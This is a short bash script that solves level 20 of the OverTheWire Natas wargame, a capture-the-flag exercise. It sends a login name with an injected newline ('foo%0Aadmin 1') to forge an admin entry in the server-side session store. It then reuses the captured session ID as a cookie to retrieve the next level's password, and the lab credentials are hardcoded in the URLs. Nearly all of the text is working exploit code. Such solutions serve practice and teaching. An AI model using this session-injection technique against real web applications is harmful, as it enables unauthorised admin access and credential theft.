#!/bin/bash
. ../natas.sh
function hack() {
	session_id=$(request-login "foo%0Aadmin 1" 2>&1 | grep -Po "(?<=\s)[\w\d]{26}(?=\s)")
	password=$(request "$session_id" 2>&1 | grep -Po "(?<=Password:\s)[\d\w]+")
	echo $(get-natas-url "21" "$password")
}

function request-login() {
	name=$1
	curl -vs \
		-d "name=${name:-admin}" \
		http://natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF@natas20.natas.labs.overthewire.org?debug=debug
}

function request() {
	curl -v \
		--cookie "$(generate-attack-string $1)" \
		http://natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF@natas20.natas.labs.overthewire.org?debug=debug
}

function generate-attack-string() {
	printf "PHPSESSID=$1"
}